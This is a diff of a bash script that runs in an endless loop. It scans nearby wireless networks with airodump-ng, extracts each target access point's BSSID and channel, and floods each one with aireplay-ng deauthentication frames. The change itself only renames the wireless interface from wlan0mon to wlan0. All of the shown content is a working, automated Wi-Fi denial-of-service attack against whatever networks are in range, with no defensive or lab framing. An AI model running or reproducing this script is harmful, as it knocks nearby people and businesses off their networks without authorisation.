@@ -6,7 +6,7 @@ airmon-ng start wlan0
 while true; do
   # Scan for nearby wireless networks and find target BSSID and channel
   echo "Scanning for wireless networks..."
-  airodump-ng --output-format csv -w scan wlan0mon > /dev/null &
+  airodump-ng --output-format csv -w scan wlan0 > /dev/null &
   sleep 60 && pkill airodump-ng
 
   # Parse the scan output to find the target BSSID and channel
@@ -16,11 +16,11 @@ while true; do
   for bssid in $targets; do
     channel=$(grep "$bssid" scan-01.csv | awk -F',' '{print $4}' | tr -d ' ')
 
-  iwconfig wlan0mon channel $channel
+  iwconfig wlan0 channel $channel	
     
     # Attack the target access point with aireplay-ng
     echo "Attacking target access point $bssid..."
-    aireplay-ng --deauth 18 -a $bssid wlan0mon --ignore-negative-one
+    aireplay-ng --deauth 18 -a $bssid wlan0 --ignore-negative-one
   done
 
   # Remove the scan output file
